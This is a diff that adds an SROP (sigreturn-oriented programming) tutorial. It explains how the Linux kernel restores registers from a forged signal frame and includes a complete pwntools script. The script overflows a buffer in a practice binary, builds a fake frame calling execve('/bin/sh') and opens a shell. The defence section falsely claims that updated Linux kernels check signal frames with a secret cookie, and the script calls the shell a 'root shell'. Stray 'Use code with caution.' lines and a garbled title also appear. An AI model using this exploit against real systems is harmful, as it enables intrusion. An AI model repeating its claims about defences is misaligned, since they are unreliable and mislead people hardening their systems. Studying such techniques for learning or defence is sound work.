@@ -1,1 +1,109 @@
+Signal-Handler / *jmp-style ROP (often referred to as SROP or Sigreturn-Oriented Programming) is a powerful exploitation technique used when a binary has very few available ROP gadgets.
+Instead of searching for individual code snippets to control each register, SROP tricks the operating system's kernel into setting every single CPU register simultaneously to an arbitrary layout of your choice. This is achieved by abusing the OS signal-handling architecture and the rt_sigreturn system call.
+
+1. The Core Mechanic: How Signal Recovery Works
+
+When a Linux program encounters an asynchronous event (like pressing Ctrl+C for SIGINT, or a memory error like SIGSEGV), the operating system suspends execution and context-switches to a Signal Handler.
+To do this cleanly, the Linux kernel must temporarily back up the program's exact current state. It pushes a structure called a Signal Frame (sigcontext) directly onto the user's stack. This frame saves a snapshot of absolutely every CPU register: RAX, RDI, RSI, RDX, RSP, RIP, etc.
+text
+Normal Program Execution
+     | (Signal Interrupt / Alarm / Crash occurs)
+     v
+[ Kernel saves state: Pushes full 'sigcontext' frame onto user stack ]
+     |
+     v
+Executes User Signal Handler
+     |
+     v
+Executes 'rt_sigreturn' system call
+     |
+     v
+[ Kernel cleans up: Pops the stack frame straight back into CPU registers ]
+     |
+     v
+Resumes Program Execution
+Use code with caution.
+
+The Vulnerability (The Deception)
+
+The kernel assumes that the sigcontext structure sitting on the stack was placed there legitimately by the OS. It performs no verification to check its authenticity.
+If an attacker uses a buffer overflow to construct a fake, custom-tailored sigcontext structure directly on the stack, and then triggers the rt_sigreturn system call (syscall with RAX = 15 on 64-bit Linux), the kernel will trustingly pop that fake frame directly into the physical hardware registers.
+
+2. Crafting the Perfect SROP Frame
+
+By spoofing the sigcontext structure, we can gain total control over the machine state in a single action:
+• Set RIP to point to a static syscall instruction.
+• Set RAX to 59 (The system call number for execve).
+• Set RDI to point to a string containing "/bin/sh".
+• Set RSI to 0 (NULL).
+• Set RDX to 0 (NULL).
+
+3. The Python SROP Exploit Script (srop_exploit.py)
+
+Constructing a Signal Frame manually by mapping byte-offsets is prone to error. Fortunately, pwntools features a built-in SigreturnFrame class that handles the entire layout computation automatically.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Set the execution architecture context (Crucial for correct frame formatting)
+context.update(arch='amd64', os='linux')
+
+# Initialize the target binary process
+io = process('./srop_vuln')
+
+# Find a generic syscall gadget in the binary (e.g., via ROPgadget or objdump)
+# We also need a way to set RAX to 15 (rt_sigreturn). 
+# A common trick is using a 'pop rax; ret' gadget or using the read() function's return value.
+syscall_address = 0x40115e
+pop_rax = 0x401155
+
+# Address of a writable memory region (like the .bss section) containing "/bin/sh"
+# Or we can place the string directly onto our stack frame and calculate its address.
+bin_sh_address = 0x404020 
+
+# Buffer overflow offset to reach the return pointer
+offset = 40
+
+# ========================================================
+# 1. BUILD THE FAKE SIGRETURN FRAME
+# ========================================================
+frame = SigreturnFrame()
+
+# Configure the registers inside our fake frame to execute a shell
+frame.rax = 59                 # sys_execve system call number
+frame.rdi = bin_sh_address     # Pointing to "/bin/sh" string location
+frame.rsi = 0                  # NULL pointer
+frame.rdx = 0                  # NULL pointer
+frame.rip = syscall_address    # Point execution straight back into a syscall
+
+# ========================================================
+# 2. STITCH THE ROP CHAIN TOGETHER
+# ========================================================
+payload = b"A" * offset
+
+# Step A: Force RAX register to equal 15 (rt_sigreturn)
+payload += p64(pop_rax)
+payload += p64(15)
+
+# Step B: Trigger a syscall to tell the kernel to execute rt_sigreturn
+payload += p64(syscall_address)
+
+# Step C: Append the forged signal context frame structure.
+# The kernel will immediately consume this data block upon executing rt_sigreturn.
+payload += bytes(frame)
+
+# Deploy the payload
+io.recvuntil(b"Enter input: ")
+log.info("Deploying fake Sigreturn structural frame...")
+io.sendline(payload)
+
+# Interact with the popped root shell
+io.interactive()
+Use code with caution.
+
+4. How Modern Defenses Neutralize SROP
+
+Because SROP provides a direct shortcut to full register execution control, contemporary operating systems implement strict structural mitigations:
+• Signal Frame Canaries / Cookies: Modern operating systems (including updated Linux distributions and security-hardened kernels) generate a random, secret cryptographic cookie when pushing a legitimate signal frame onto the stack. When rt_sigreturn is called, the kernel checks for the presence and validity of this cookie. If an attacker injects a fake frame without knowing the cookie, the kernel drops the execution state instantly.
+• Seccomp Filters: Secure Computing (seccomp) mode limits what system call numbers a binary is legally allowed to execute. By filtering or explicitly blocking the rt_sigreturn system call number (15) or execve (59), system administrators can render SROP chains completely non-functional, even if an attacker successfully controls the registers.
 
